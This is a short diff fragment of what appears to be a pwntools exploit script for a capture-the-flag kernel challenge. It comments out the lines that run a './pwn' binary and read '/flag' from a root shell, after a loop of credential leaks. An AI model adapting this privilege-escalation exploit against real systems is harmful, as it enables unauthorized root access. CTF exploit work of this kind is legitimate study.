@@ -56,8 +56,8 @@ sp( 'chmod +x ./pwn' )
 for _ in range(3):
     leak()
 
-sp( './pwn' ) # cred should be the same as first leak
+#sp( './pwn' ) # cred should be the same as first leak
 
-y.sendlineafter( '/tmp #' , 'cat /flag' ) # root !
+#y.sendlineafter( '/tmp #' , 'cat /flag' ) # root !
 
 y.interactive()
